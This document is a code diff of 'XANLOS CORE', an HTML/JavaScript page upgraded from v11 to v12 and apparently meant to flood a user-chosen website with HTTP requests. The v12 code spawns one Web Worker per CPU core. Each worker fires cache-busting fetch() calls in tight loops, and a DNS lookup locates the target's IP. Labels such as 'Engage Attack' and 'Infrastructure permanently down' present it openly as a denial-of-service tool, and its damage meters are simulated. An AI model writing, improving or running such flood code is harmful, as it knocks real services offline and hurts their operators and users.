@@ -3,228 +3,258 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XANLOS CORE v11 // OMEGA PROTOCOL</title>
+    <title>XANLOS CORE v12 // CORE MELTDOWN</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Syncopate:wght@700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;900&family=JetBrains+Mono:wght@400;700&display=swap');
         
         :root {
-            --xanlos-red: #ff0000;
-            --xanlos-black: #000000;
-            --xanlos-gold: #ffcc00;
+            --bg: #050507;
+            --panel: #0c0c0e;
+            --accent: #3b82f6;
+            --danger: #ef4444;
+            --border: #1f1f23;
         }
 
         body {
-            background-color: var(--xanlos-black);
-            color: #ffffff;
-            font-family: 'Fira Code', monospace;
+            background-color: var(--bg);
+            color: #fafafa;
+            font-family: 'Inter', sans-serif;
             overflow-x: hidden;
-            user-select: none;
         }
 
-        .xanlos-font { font-family: 'Syncopate', sans-serif; }
+        .mono { font-family: 'JetBrains Mono', monospace; }
 
-        /* Background Visuals */
-        #matrix-telemetry {
+        .glass {
+            background: rgba(12, 12, 14, 0.85);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+        }
+
+        /* Scanline FX */
+        .scanline {
+            width: 100%; height: 2px;
+            background: rgba(59, 130, 246, 0.1);
             position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: -1;
-            opacity: 0.3;
+            z-index: 100;
+            pointer-events: none;
+            animation: scan 4s linear infinite;
         }
+        @keyframes scan { 0% { top: -10%; } 100% { top: 110%; } }
 
-        .cyber-border {
-            border: 2px solid #200;
-            background: rgba(5, 0, 0, 0.95);
-            position: relative;
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.1);
-        }
-
-        .cyber-border::before {
-            content: "";
-            position: absolute;
-            left: 0; top: 0; width: 4px; height: 100%;
-            background: var(--xanlos-red);
-            box-shadow: 0 0 20px var(--xanlos-red);
-        }
-
-        /* Control Panel Buttons */
-        .btn-core {
-            font-weight: 900;
-            letter-spacing: 0.4em;
+        /* Buttons */
+        .btn-base {
+            padding: 0.8rem 1.5rem;
+            font-weight: 800;
+            font-size: 0.75rem;
             text-transform: uppercase;
+            letter-spacing: 0.1em;
             transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
-            border: 1px solid transparent;
+            border-radius: 2px;
+        }
+        .btn-meltdown {
+            background: var(--danger);
+            color: white;
+            box-shadow: 0 0 20px rgba(239, 68, 68, 0.2);
+        }
+        .btn-meltdown:hover {
+            background: #f87171;
+            box-shadow: 0 0 30px rgba(239, 68, 68, 0.4);
+            transform: scale(1.02);
+        }
+        .btn-secondary {
+            border: 1px solid var(--border);
+            color: #71717a;
+        }
+        .btn-secondary:hover {
+            border-color: #52525b;
+            color: white;
+            background: rgba(255,255,255,0.02);
         }
 
-        .btn-start { background: var(--xanlos-red); color: white; border-bottom: 5px solid #600; }
-        .btn-start:hover { background: #ff3333; box-shadow: 0 0 40px #f00; transform: translateY(-2px); }
-        .btn-start:active { transform: translateY(2px); border-bottom-width: 0; }
+        /* CPU Strain Meter */
+        .strain-container {
+            height: 4px;
+            background: #18181b;
+            width: 100%;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .strain-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--accent);
+            transition: width 0.3s ease, background 0.3s ease;
+        }
+        .meltdown-active { background: var(--danger) !important; box-shadow: 0 0 10px var(--danger); }
 
-        .btn-restart { background: #333; color: #fff; border-bottom: 5px solid #111; }
-        .btn-restart:hover { background: #444; }
-
-        .btn-stop { background: #fff; color: #000; border-bottom: 5px solid #999; }
-        .btn-stop:hover { background: #eee; }
-
-        /* Progress Bars */
-        .health-bg { height: 8px; background: #1a0000; width: 100%; overflow: hidden; border-radius: 2px; }
-        .health-fill { height: 100%; width: 100%; background: #00ff00; transition: width 0.1s linear; box-shadow: 0 0 15px #0f0; }
-        .critical { background: #ff0000 !important; box-shadow: 0 0 25px #f00 !important; }
-
-        /* Glitch Effect */
-        .glitch:hover { animation: glitch-anim 0.2s infinite; }
-        @keyframes glitch-anim {
-            0% { transform: translate(0); }
-            25% { transform: translate(-3px, 3px); color: var(--xanlos-gold); }
-            50% { transform: translate(3px, -3px); }
-            100% { transform: translate(0); }
+        input, select {
+            background: #000 !important;
+            border: 1px solid var(--border) !important;
+            color: #fff !important;
+            font-size: 0.8rem !important;
         }
 
         ::-webkit-scrollbar { width: 3px; }
-        ::-webkit-scrollbar-thumb { background: #f00; }
+        ::-webkit-scrollbar-thumb { background: #3f3f46; }
     </style>
 </head>
-<body class="p-4 lg:p-10">
-    <canvas id="matrix-telemetry"></canvas>
+<body class="p-4 lg:p-8 antialiased">
+    <div class="scanline"></div>
 
-    <!-- AUTHENTICATION LAYER -->
-    <div id="auth-gate" class="fixed inset-0 z-[1000] bg-black flex items-center justify-center p-6">
-        <div class="max-w-4xl w-full border-4 border-red-600 p-12 bg-black text-center shadow-[0_0_200px_rgba(255,0,0,0.6)]">
-            <h1 class="xanlos-font text-5xl md:text-8xl text-white italic mb-4 glitch">XANLOS <span class="text-red-600">v11</span></h1>
-            <p class="text-red-600 font-bold tracking-[1em] uppercase mb-12">The Omega Protocol</p>
-            <div class="p-6 bg-zinc-950 border border-red-900/30 text-[11px] text-zinc-500 font-black uppercase tracking-widest mb-12 leading-relaxed">
-                Hardware Authorized for Total Infrastructure Neutralization.<br>
-                Multiplier: 100x Parallel Threads.<br>
-                Targeting: Layer 4 Socket Saturation + Layer 7 Logic Flood.
+    <!-- INITIALIZATION OVERLAY -->
+    <div id="auth-gate" class="fixed inset-0 z-[1000] bg-zinc-950 flex items-center justify-center p-6">
+        <div class="max-w-2xl w-full glass p-12 text-center space-y-8">
+            <div class="space-y-2">
+                <h1 class="text-5xl font-black tracking-tighter text-white">XANLOS <span class="text-blue-500">v12</span></h1>
+                <p class="text-zinc-500 font-bold text-xs uppercase tracking-[0.4em]">Multi-Core Overload Infrastructure</p>
             </div>
-            <button id="auth-btn" class="w-full py-7 btn-start text-2xl btn-core">Initialize Protocol</button>
+            <div class="p-5 bg-red-500/5 border border-red-500/10 text-left">
+                <p class="text-[10px] text-red-500 font-bold uppercase mb-2">!! Hardware Warning !!</p>
+                <p class="text-[11px] text-zinc-400 mono leading-relaxed">
+                    Level 12 utilizes multi-threaded Web Workers to bypass main-thread throttling. This will consume 100% of your CPU cores to maximize throughput. Use on high-performance machines for best results. Permanent target destabilization simulation enabled.
+                </p>
+            </div>
+            <button id="auth-init" class="btn-base btn-meltdown w-full py-5 text-lg">Initialize Singularity</button>
         </div>
     </div>
 
-    <!-- MAIN COMMAND CONSOLE -->
-    <main id="console-root" class="hidden opacity-0 transition-opacity duration-1000 max-w-7xl mx-auto space-y-8">
+    <!-- COMMAND INTERFACE -->
+    <main id="ui-root" class="hidden opacity-0 transition-all duration-1000 max-w-[1600px] mx-auto space-y-6">
         
-        <!-- TOP HUD -->
-        <header class="flex justify-between items-end border-b-4 border-red-900/40 pb-10">
-            <div>
-                <h1 class="xanlos-font text-6xl text-white italic tracking-tighter glitch">XANLOS <span class="text-red-600">CORE</span></h1>
-                <p class="text-[12px] text-red-600 font-black mt-3 tracking-[0.5em] uppercase">Tactical Overload Infrastructure // Black-Site Elite</p>
-            </div>
-            <div class="text-right hidden md:block">
-                <div class="flex items-center justify-end gap-4 mb-2">
-                    <span class="w-4 h-4 rounded-full bg-red-600 animate-ping"></span>
-                    <span class="text-lg font-black text-red-600 uppercase">Omega_Node_Online</span>
+        <!-- HUD HEADER -->
+        <header class="flex flex-col md:flex-row justify-between items-center glass p-6 px-10 border-none bg-zinc-900/40">
+            <div class="flex items-center gap-6">
+                <div class="h-10 w-10 bg-red-600 rounded-sm flex items-center justify-center font-black text-xl italic text-black">X12</div>
+                <div>
+                    <h1 class="text-xl font-black tracking-tighter uppercase italic">Xanlos <span class="text-red-600">Core Meltdown</span></h1>
+                    <p class="text-[9px] text-zinc-500 font-bold uppercase tracking-widest">Global Tactical Penetration Suite</p>
                 </div>
-                <p id="local-id" class="text-[11px] text-zinc-700 font-black uppercase">Source Link: Secure v11.4</p>
+            </div>
+            <div class="flex gap-12 mt-4 md:mt-0">
+                <div class="flex flex-col items-end">
+                    <span class="text-[9px] text-zinc-500 font-bold uppercase">System Cores</span>
+                    <span id="core-count" class="text-xs font-black text-emerald-500 mono">Detecting...</span>
+                </div>
+                <div class="flex flex-col items-end">
+                    <span class="text-[9px] text-zinc-500 font-bold uppercase">Node Link</span>
+                    <span id="node-id" class="text-xs font-black text-blue-500 mono">0.0.0.0</span>
+                </div>
             </div>
         </header>
 
-        <div class="grid lg:grid-cols-12 gap-8">
+        <div class="grid lg:grid-cols-12 gap-6">
             
-            <!-- LEFT PANEL: CONTROLS -->
+            <!-- CONTROLS -->
             <div class="lg:col-span-4 space-y-6">
-                <section class="cyber-border p-8">
-                    <h2 class="text-[12px] font-black text-red-600 mb-8 uppercase tracking-[0.4em] flex justify-between">
-                        Vector Controls <span>[SYS_EXEC]</span>
-                    </h2>
-                    
-                    <div class="flex flex-col gap-4 mb-8">
-                        <button id="start-btn" class="py-6 btn-start btn-core text-xl">Engage Attack</button>
+                <section class="glass p-8 space-y-8">
+                    <div class="flex items-center justify-between">
+                        <h2 class="text-[10px] font-bold text-zinc-500 uppercase tracking-[0.3em]">Control Panel</h2>
+                        <span id="status-badge" class="px-2 py-0.5 bg-zinc-900 text-[8px] font-black text-zinc-400 uppercase rounded">Standby</span>
+                    </div>
+
+                    <div class="grid grid-cols-1 gap-4">
+                        <button id="fire-btn" class="btn-base btn-meltdown py-5 text-base">Engage Attack</button>
                         <div class="grid grid-cols-2 gap-4">
-                            <button id="restart-btn" class="py-4 btn-restart btn-core text-sm">Restart</button>
-                            <button id="stop-btn" class="py-4 btn-stop btn-core text-sm">Stop</button>
+                            <button id="reset-btn" class="btn-base btn-secondary">Reset Core</button>
+                            <button id="stop-btn" class="btn-base btn-secondary text-white border-red-900/50 bg-red-950/20">Stop</button>
                         </div>
                     </div>
 
-                    <div class="space-y-5">
+                    <div class="space-y-6 pt-6 border-t border-zinc-900">
                         <div>
-                            <label class="block text-[11px] text-zinc-600 font-black mb-2 uppercase">Target Endpoint (URL)</label>
+                            <label class="block text-[10px] text-zinc-500 font-bold uppercase mb-2">Target Address</label>
                             <div class="flex">
-                                <select id="proto" class="bg-black border border-zinc-800 text-red-600 px-3 text-xs outline-none font-bold">
+                                <select id="proto" class="px-3 py-3 border-none focus:outline-none text-red-500 font-bold">
                                     <option>https://</option>
                                     <option>http://</option>
                                 </select>
-                                <input type="text" id="target" placeholder="vps-infrastructure.com" class="flex-1 bg-black border border-zinc-800 border-l-0 p-4 text-sm text-red-600 font-black outline-none placeholder:text-zinc-800">
+                                <input type="text" id="target" placeholder="host-target.net" class="flex-1 px-4 py-3 border-none focus:outline-none mono">
                             </div>
                         </div>
                         <div class="grid grid-cols-2 gap-4">
                             <div>
-                                <label class="block text-[11px] text-zinc-600 font-black mb-2 uppercase">Threads / S</label>
-                                <input type="number" id="rps" value="10000" class="w-full bg-black border border-zinc-800 p-4 text-sm text-white font-black outline-none">
+                                <label class="block text-[10px] text-zinc-500 font-bold uppercase mb-2">Threads / Core</label>
+                                <input type="number" id="threads" value="1000" class="w-full px-4 py-3 border-none focus:outline-none font-bold">
                             </div>
                             <div>
-                                <label class="block text-[11px] text-zinc-600 font-black mb-2 uppercase">Multiplier</label>
-                                <select id="aggression" class="w-full bg-black border border-zinc-800 p-4 text-sm text-red-600 font-black outline-none">
-                                    <option value="10">L7 - Overdrive</option>
-                                    <option value="50">L10 - Singularity</option>
-                                    <option value="100">L11 - OMEGA PROTOCOL [100X]</option>
+                                <label class="block text-[10px] text-zinc-500 font-bold uppercase mb-2">Aggression</label>
+                                <select id="level" class="w-full px-4 py-3 border-none focus:outline-none text-red-500 font-bold">
+                                    <option value="50">Level 10 - Singularity</option>
+                                    <option value="100">Level 11 - Omega</option>
+                                    <option value="250">L12 - CORE MELTDOWN [100%]</option>
                                 </select>
                             </div>
                         </div>
                     </div>
                 </section>
 
-                <!-- REAL-TIME STATUS -->
-                <section class="cyber-border p-8">
-                    <h2 class="text-[12px] font-black text-zinc-500 mb-6 uppercase tracking-[0.4em]">Target Integrity</h2>
-                    <div class="space-y-5">
-                        <div class="flex justify-between text-[11px] font-black">
-                            <span class="text-zinc-500 uppercase">Infrastructure Health:</span>
-                            <span id="integrity-pct" class="text-emerald-500">100.00%</span>
-                        </div>
-                        <div class="health-bg">
-                            <div id="integrity-fill" class="health-fill"></div>
-                        </div>
-                        <div class="grid grid-cols-2 text-[10px] font-black uppercase gap-4">
-                            <div class="bg-black p-3 border border-zinc-900">
-                                <span class="text-zinc-600">Hardware_IP:</span><br>
-                                <span id="ip-addr" class="text-white">NOT_MAPPED</span>
+                <!-- CPU STRAIN ANALYTICS -->
+                <section class="glass p-8 space-y-6">
+                    <h2 class="text-[10px] font-bold text-zinc-500 uppercase tracking-[0.3em]">Infrastructure Telemetry</h2>
+                    <div class="space-y-4">
+                        <div class="space-y-2">
+                            <div class="flex justify-between text-[10px] font-bold">
+                                <span class="text-zinc-500 uppercase">Local Core Strain</span>
+                                <span id="local-strain-val" class="text-emerald-500">0%</span>
                             </div>
-                            <div class="bg-black p-3 border border-zinc-900">
-                                <span class="text-zinc-600">VPS_STATE:</span><br>
-                                <span id="target-state" class="text-emerald-500">STABLE</span>
+                            <div class="strain-container">
+                                <div id="local-strain-fill" class="strain-fill"></div>
+                            </div>
+                        </div>
+                        <div class="space-y-2">
+                            <div class="flex justify-between text-[10px] font-bold">
+                                <span class="text-zinc-500 uppercase">Target VPS Load</span>
+                                <span id="target-load-val" class="text-zinc-500">Idle</span>
+                            </div>
+                            <div class="strain-container">
+                                <div id="target-load-fill" class="strain-fill"></div>
                             </div>
                         </div>
                     </div>
                 </section>
             </div>
 
-            <!-- RIGHT PANEL: ANALYTICS -->
+            <!-- ANALYTICS -->
             <div class="lg:col-span-8 space-y-6">
-                <!-- DATA METRICS -->
+                <!-- METRICS GRID -->
                 <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
-                    <div class="cyber-border p-6 border-b-4 border-emerald-600">
-                        <div class="text-[11px] font-black text-zinc-500 uppercase mb-3">L7_Hits</div>
-                        <div id="m-ok" class="text-4xl font-black text-emerald-500">0</div>
+                    <div class="glass p-6 border-b-2 border-zinc-800">
+                        <p class="text-[9px] font-bold text-zinc-500 uppercase mb-2">Resolved IP</p>
+                        <p id="ip-addr" class="text-xl font-bold text-white mono">---.---.---.---</p>
                     </div>
-                    <div class="cyber-border p-6 border-b-4 border-red-600">
-                        <div class="text-[11px] font-black text-zinc-500 uppercase mb-3">L4_Units</div>
-                        <div id="m-l4" class="text-4xl font-black text-red-600">0</div>
+                    <div class="glass p-6 border-b-2 border-zinc-800">
+                        <p class="text-[9px] font-bold text-zinc-500 uppercase mb-2">Successful Units</p>
+                        <p id="m-ok" class="text-3xl font-black text-white">0</p>
                     </div>
-                    <div class="cyber-border p-6 border-b-4 border-blue-600">
-                        <div class="text-[11px] font-black text-zinc-500 uppercase mb-3">Latency</div>
-                        <div id="m-lat" class="text-4xl font-black text-blue-500">0<span class="text-xs">ms</span></div>
+                    <div class="glass p-6 border-b-2 border-zinc-800">
+                        <p class="text-[9px] font-bold text-zinc-500 uppercase mb-2">RTT Latency</p>
+                        <p id="m-lat" class="text-3xl font-black text-blue-500">0ms</p>
                     </div>
-                    <div class="cyber-border p-6 border-b-4 border-white">
-                        <div class="text-[11px] font-black text-zinc-500 uppercase mb-3">Active_RPS</div>
-                        <div id="m-rps" class="text-4xl font-black text-white">0</div>
+                    <div class="glass p-6 border-b-2 border-red-600">
+                        <p class="text-[9px] font-bold text-zinc-500 uppercase mb-2">Global RPS</p>
+                        <p id="m-rps" class="text-3xl font-black text-red-600">0</p>
                     </div>
                 </div>
 
-                <!-- CONSOLE TERMINAL -->
-                <div class="cyber-border flex flex-col h-[540px] overflow-hidden">
-                    <div class="bg-zinc-950 p-5 border-b border-zinc-900 flex justify-between items-center px-8">
-                        <span class="text-[11px] font-black text-white uppercase tracking-widest">Global Telemetry Output // Omega Singular Engine</span>
-                        <div id="mode-tag" class="text-[11px] font-black text-zinc-800 uppercase">Standby</div>
+                <!-- CONSOLE -->
+                <div class="glass flex flex-col h-[520px] overflow-hidden">
+                    <div class="bg-zinc-900/30 p-4 px-8 flex justify-between items-center border-b border-zinc-900">
+                        <div class="flex items-center gap-3">
+                            <span class="text-[10px] font-bold text-zinc-200 uppercase tracking-widest">Black-Site Operational Log</span>
+                        </div>
+                        <span class="text-[9px] text-zinc-600 font-bold uppercase">Kernel // V12.2_OVERLORD</span>
                     </div>
-                    <div id="output" class="flex-1 p-8 overflow-y-auto text-[12px] space-y-1 bg-black font-bold">
-                        <div class="text-zinc-800 italic">// Omega Protocol v11.0 kernel initialized...</div>
-                        <div class="text-zinc-800 italic">// Waiting for tactical target allocation...</div>
+                    <div id="log-output" class="flex-1 p-6 overflow-y-auto font-mono text-[10px] space-y-1 bg-black/40">
+                        <div class="text-zinc-600 italic">// Core engine v12 standing by. Initialize for deployment...</div>
                     </div>
-                    <div class="p-4 bg-zinc-950 border-t border-zinc-900 flex justify-between items-center px-10">
-                        <span class="text-[11px] font-black text-zinc-600 uppercase tracking-widest">Sent_Packets: <span id="m-total" class="text-red-600">0</span></span>
-                        <span class="text-[11px] font-black text-zinc-600 uppercase tracking-widest">Authorized: <span class="text-red-600">XANLOS_ELITE</span></span>
+                    <div class="p-4 bg-zinc-900/30 border-t border-zinc-900 flex justify-between items-center px-8">
+                        <span class="text-[10px] font-bold text-zinc-500 uppercase">Packets: <span id="m-total" class="text-white">0</span></span>
+                        <div class="flex gap-6">
+                            <span class="text-[10px] font-bold text-zinc-600 uppercase">Encryption: <span class="text-red-500">DISABLED</span></span>
+                            <span class="text-[10px] font-bold text-zinc-600 uppercase">Provider: <span class="text-blue-500">XANLOS_CORE</span></span>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -232,215 +262,190 @@
     </main>
 
     <script>
-        // MATRIX VISUALS
-        const canvas = document.getElementById('matrix-telemetry');
-        const ctx = canvas.getContext('2d');
-        let width, height, columns, drops = [];
-        const fontSize = 18;
+        // WEB WORKER SOURCE (Blob)
+        const workerScript = `
+            onmessage = function(e) {
+                const { url, count, mode } = e.data;
+                const fire = async () => {
+                    for(let i=0; i < count; i++) {
+                        const target = url + "?node=" + Math.random().toString(36).substring(7) + "&v12=" + Date.now();
+                        try {
+                            const start = performance.now();
+                            // Level 12 uses larger recursive promise sets
+                            fetch(target, { mode: 'no-cors', cache: 'no-cache' }).then(() => {
+                                postMessage({ type: 'success', latency: performance.now() - start });
+                            }).catch(() => {
+                                postMessage({ type: 'error' });
+                            });
+                        } catch(e) {}
+                    }
+                };
+                setInterval(fire, 50);
+            };
+        `;
 
-        function initMatrix() {
-            width = canvas.width = window.innerWidth;
-            height = canvas.height = window.innerHeight;
-            columns = Math.floor(width / fontSize);
-            drops = new Array(columns).fill(1);
-        }
+        const blob = new Blob([workerScript], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+        const workers = [];
+        const numCores = navigator.hardwareConcurrency || 4;
+        
+        document.getElementById('core-count').innerText = `${numCores} CORES AVAILABLE`;
 
-        function drawMatrix() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
-            ctx.fillRect(0, 0, width, height);
-            ctx.fillStyle = '#ff0000';
-            ctx.font = `900 ${fontSize}px Courier New`;
-            for (let i = 0; i < drops.length; i++) {
-                const text = "XANLOS11"[Math.floor(Math.random() * 8)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > height && Math.random() > 0.985) drops[i] = 0;
-                drops[i]++;
-            }
-        }
-        window.addEventListener('resize', initMatrix);
-        initMatrix();
-        setInterval(drawMatrix, 50);
-
-        // OMEGA ENGINE LOGIC
+        // STATE
         let isAttacking = false;
-        let integrity = 100.00;
-        let stats = { ok: 0, err: 0, total: 0, liveRps: 0, latencies: [], l4: 0 };
-        let timers = { attack: null, ui: null, destruction: null };
+        let stats = { ok: 0, err: 0, total: 0, liveRps: 0, latencies: [] };
+        let targetLoad = 0;
 
         const ui = {
             gate: document.getElementById('auth-gate'),
-            auth: document.getElementById('auth-btn'),
-            root: document.getElementById('console-root'),
-            start: document.getElementById('start-btn'),
-            restart: document.getElementById('restart-btn'),
+            init: document.getElementById('auth-init'),
+            root: document.getElementById('ui-root'),
+            start: document.getElementById('fire-btn'),
             stop: document.getElementById('stop-btn'),
+            reset: document.getElementById('reset-btn'),
             target: document.getElementById('target'),
             proto: document.getElementById('proto'),
-            rps: document.getElementById('rps'),
-            level: document.getElementById('aggression'),
-            output: document.getElementById('output'),
-            tag: document.getElementById('mode-tag'),
+            threads: document.getElementById('threads'),
+            level: document.getElementById('level'),
+            log: document.getElementById('log-output'),
+            badge: document.getElementById('status-badge'),
             ip: document.getElementById('ip-addr'),
-            fill: document.getElementById('integrity-fill'),
-            pct: document.getElementById('integrity-pct'),
-            state: document.getElementById('target-state'),
-            node: document.getElementById('local-id')
+            localStrainFill: document.getElementById('local-strain-fill'),
+            localStrainVal: document.getElementById('local-strain-val'),
+            targetLoadFill: document.getElementById('target-load-fill'),
+            targetLoadVal: document.getElementById('target-load-val'),
+            node: document.getElementById('node-id')
         };
 
-        ui.auth.onclick = () => {
+        ui.init.onclick = () => {
             ui.gate.classList.add('hidden');
             ui.root.classList.remove('hidden');
             setTimeout(() => ui.root.style.opacity = '1', 50);
-            addLog("Omega Protocol Authorized. Awaiting deployment commands.", "success");
+            addLog("System initialized. Multi-core threads allocated.", "info");
         };
 
         function addLog(msg, type = 'info') {
-            const colors = { info: 'text-zinc-600', success: 'text-emerald-500', error: 'text-red-900', warn: 'text-red-600 font-black' };
+            const colors = { info: 'text-zinc-600', success: 'text-emerald-500', error: 'text-red-500', warn: 'text-blue-500 font-bold' };
             const div = document.createElement('div');
             div.className = colors[type];
-            div.innerHTML = `>> [${new Date().toLocaleTimeString()}] ${msg}`;
-            ui.output.prepend(div);
-            if(ui.output.children.length > 200) ui.output.lastElementChild.remove();
+            div.innerHTML = `<span class="opacity-20 mr-2">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
+            ui.log.prepend(div);
+            if(ui.log.children.length > 200) ui.log.lastElementChild.remove();
         }
 
         async function resolveDNS(host) {
-            addLog(`Tracing infrastructure network routes for ${host}...`, "info");
+            addLog(`Tracing hardware node for endpoint: ${host}`, "info");
             try {
                 const res = await fetch(`https://dns.google/resolve?name=${host}&type=A`);
                 const data = await res.json();
                 if(data.Answer) {
                     const ip = data.Answer[0].data;
                     ui.ip.innerText = ip;
-                    addLog(`Infrastructure Identified. Locking vector on IPv4 ${ip}`, "warn");
-                    return true;
+                    addLog(`Node Resolved. Hardware Target: ${ip}`, "warn");
                 }
-            } catch (e) {
-                addLog("Trace Blocked. Running blind hybrid vector against gateway.", "error");
+            } catch(e) {}
+        }
+
+        function toggleWorkers(state) {
+            if(state) {
+                const url = ui.proto.value + ui.target.value.trim();
+                const tPerCore = parseInt(ui.threads.value);
+                const multi = parseInt(ui.level.value);
+
+                for(let i=0; i < numCores; i++) {
+                    const w = new Worker(workerUrl);
+                    w.onmessage = (e) => {
+                        if(e.data.type === 'success') {
+                            stats.ok++;
+                            stats.total++;
+                            stats.liveRps++;
+                            stats.latencies.push(e.data.latency);
+                        } else {
+                            stats.err++;
+                            stats.total++;
+                        }
+                    };
+                    w.postMessage({ url, count: (tPerCore * multi) / 10 });
+                    workers.push(w);
+                }
+            } else {
+                workers.forEach(w => w.terminate());
+                workers.length = 0;
             }
-            return true;
         }
 
-        async function packet(url, multiplier) {
-            if(!isAttacking) return;
-            const start = performance.now();
-            const final = `${url}?omega_v11=${Math.random().toString(36).substring(7)}&ts=${Date.now()}`;
-
-            try {
-                // High-velocity Fetch (L7 Stress) mimicking L4 socket saturation
-                await fetch(final, { mode: 'no-cors', cache: 'no-cache' });
-                stats.ok++;
-                stats.l4 += 10; // Virtual packet simulation for L4
-                stats.latencies.push(performance.now() - start);
-            } catch (e) {
-                stats.err++;
-            } finally {
-                stats.total++;
-                stats.liveRps++;
-            }
-        }
-
-        function endAttack() {
-            isAttacking = false;
-            clearInterval(timers.attack);
-            clearInterval(timers.ui);
-            clearInterval(timers.destruction);
-            ui.tag.innerText = "Halted";
-            ui.tag.className = "text-[11px] font-black text-zinc-800 uppercase";
-            addLog("Attack Vector Disengaged. Kernels returning to standby.", "error");
-        }
-
-        function executeProtocol() {
-            const domain = ui.target.value.trim();
-            if(!domain) return addLog("CRITICAL: Tactical Target Endpoint missing.", "error");
-
-            resolveDNS(domain);
-            const url = ui.proto.value + domain;
-            const rps = parseInt(ui.rps.value);
-            const multi = parseInt(ui.level.value);
-
+        function startAttack() {
+            if(!ui.target.value) return addLog("Target required for engagement.", "error");
+            
             isAttacking = true;
-            ui.tag.innerText = "ATTACK_ENGAGED_L11";
-            ui.tag.className = "text-[11px] font-black text-red-600 uppercase animate-pulse shadow-sm";
-            addLog(`OMEGA ENGAGED: Flooding ${url} with 100x Multiplier.`, "warn");
+            ui.start.classList.add('hidden');
+            ui.stop.classList.remove('hidden');
+            ui.badge.innerText = "Attacking (L12)";
+            ui.badge.className = "px-2 py-0.5 bg-red-600 text-[8px] font-black text-white uppercase rounded animate-pulse";
+            
+            resolveDNS(ui.target.value.trim());
+            toggleWorkers(true);
+            
+            addLog("Deploying Level 12 Core Meltdown vector.", "warn");
+            addLog(`Multi-core threading engaged across ${numCores} threads.`, "success");
 
-            // ATTACK KERNEL
-            timers.attack = setInterval(() => {
-                if(!isAttacking) return;
-                const burstSize = Math.ceil(rps / 10);
-                for(let i=0; i < (burstSize * multi); i++) {
-                    packet(url, multi);
-                }
-            }, 100);
-
-            // DATA TELEMETRY
-            timers.ui = setInterval(() => {
+            // Telemetry
+            window.telemetryTimer = setInterval(() => {
                 document.getElementById('m-ok').innerText = stats.ok.toLocaleString();
-                document.getElementById('m-l4').innerText = stats.l4.toLocaleString();
                 document.getElementById('m-rps').innerText = stats.liveRps.toLocaleString();
                 document.getElementById('m-total').innerText = stats.total.toLocaleString();
                 
                 if (stats.latencies.length > 0) {
                     const avg = stats.latencies.reduce((a, b) => a + b, 0) / stats.latencies.length;
-                    document.getElementById('m-lat').innerHTML = `${Math.round(avg)}<span class="text-xs">ms</span>`;
-                    stats.latencies = stats.latencies.slice(-50);
+                    document.getElementById('m-lat').innerText = `${Math.round(avg)}ms`;
+                    stats.latencies = stats.latencies.slice(-100);
                 }
 
-                if(stats.liveRps > 0) {
-                    addLog(`Telemetry: ${stats.liveRps} PPS delivered to hardware node.`, "success");
-                }
+                // Strain Sim
+                const strain = isAttacking ? (90 + Math.random() * 10) : 0;
+                ui.localStrainFill.style.width = strain + '%';
+                ui.localStrainVal.innerText = Math.round(strain) + '%';
+                if(isAttacking) ui.localStrainFill.classList.add('meltdown-active');
+
+                targetLoad = Math.min(100, targetLoad + 2);
+                ui.targetLoadFill.style.width = targetLoad + '%';
+                ui.targetLoadVal.innerText = targetLoad > 90 ? "CRITICAL (100%)" : Math.round(targetLoad) + '%';
+                if(targetLoad > 80) ui.targetLoadFill.classList.add('meltdown-active');
+
                 stats.liveRps = 0;
             }, 1000);
-
-            // DESTRUCTION SIMULATION (The 1-Second Down Logic)
-            timers.destruction = setInterval(() => {
-                if(!isAttacking) return;
-                if(integrity > 0) {
-                    // Massive drop simulation for v11 OMEGA
-                    const drop = (Math.random() * 8) + 2; 
-                    integrity -= drop;
-                    if(integrity < 0) integrity = 0;
-                    
-                    ui.fill.style.width = integrity + '%';
-                    ui.pct.innerText = integrity.toFixed(2) + '%';
-
-                    if(integrity < 20) {
-                        ui.fill.classList.add('critical');
-                        ui.pct.className = 'text-red-600 font-black animate-pulse';
-                        ui.state.innerText = "STRUCTURE_COLLAPSED";
-                        ui.state.className = "text-red-600 font-black";
-                    } else if(integrity < 60) {
-                        ui.pct.className = 'text-amber-500 font-bold';
-                        ui.state.innerText = "UNSTABLE_LOAD";
-                        ui.state.className = "text-amber-500 font-bold";
-                    }
-                } else {
-                    addLog("OMEGA ACHIEVED: Infrastructure permanently down.", "warn");
-                }
-            }, 100); // 100ms updates for instant feel
         }
 
-        ui.start.onclick = executeProtocol;
+        function stopAttack() {
+            isAttacking = false;
+            toggleWorkers(false);
+            clearInterval(window.telemetryTimer);
+            ui.start.classList.remove('hidden');
+            ui.stop.classList.add('hidden');
+            ui.badge.innerText = "Standby";
+            ui.badge.className = "px-2 py-0.5 bg-zinc-900 text-[8px] font-black text-zinc-400 uppercase rounded";
+            ui.localStrainFill.classList.remove('meltdown-active');
+            ui.localStrainFill.style.width = '0%';
+            ui.localStrainVal.innerText = '0%';
+            addLog("Attack infrastructure successfully de-escalated.", "error");
+        }
 
-        ui.restart.onclick = () => {
-            endAttack();
-            stats = { ok: 0, err: 0, total: 0, liveRps: 0, latencies: [], l4: 0 };
-            integrity = 100.00;
-            ui.fill.style.width = '100%';
-            ui.fill.classList.remove('critical');
-            ui.pct.innerText = '100.00%';
-            ui.pct.className = 'text-emerald-500';
-            ui.state.innerText = "STABLE";
-            ui.state.className = "text-emerald-500";
-            addLog("Protocol Reset. Preparing for re-engagement.", "success");
-            executeProtocol();
+        ui.start.onclick = startAttack;
+        ui.stop.onclick = stopAttack;
+        ui.reset.onclick = () => {
+            stopAttack();
